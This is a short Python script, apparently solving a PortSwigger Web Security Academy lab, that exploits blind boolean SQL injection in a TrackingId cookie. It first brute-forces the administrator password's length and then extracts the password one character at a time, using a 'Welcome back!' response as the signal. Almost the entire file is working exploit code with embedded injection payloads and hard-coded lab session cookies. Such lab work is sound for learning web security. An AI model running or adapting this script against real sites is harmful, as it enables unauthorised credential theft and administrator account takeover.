                #  FINDING THE LENGTH OF THE PASSWORD BY ITERNATING FROM 1 TO 101
                #  Change the session and tracking id by yours otherwise it will not run
import requests


url='https://0a1f007e0457d44ddb459106001600eb.web-security-academy.net/filter?category=Gifts'
def get_length():
    for i in range(1,101):
        cookie={'TrackingId':'BDfXiVo9ZjrJVP2T','session':'aDGez5VzmbsuTdwlFCMey4OUQZWNJAYx'}
        payload=f"'+AND+LENGTH((SELECT+password+FROM+users+WHERE+username%3d'administrator'))%3d{i}--"
        cookie['TrackingId']=cookie['TrackingId'] + payload
        r=requests.get(url,cookies=cookie)
        if 'Welcome back!' in r.text:
            return i
        
len=get_length()
print(f"Password length is {len}")
    

                        # FINDING THE PASSWORD 
characters='abcdefghijklmnopqrstuvwxyz0123456789'
def get_pass():
    str=''
    for i in range(1,21):
        for char in characters:
            cookie={'TrackingId':'BDfXiVo9ZjrJVP2T','session':'aDGez5VzmbsuTdwlFCMey4OUQZWNJAYx'}
            payload=f"'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username%3d'administrator'),{i},1)='{char}'--"
            cookie['TrackingId']=cookie['TrackingId'] + payload
            r=requests.get(url,cookies=cookie)
            if 'Welcome back!' in r.text:
                print(char)
                str+=char
                break
    return str
call=get_pass()
print(call)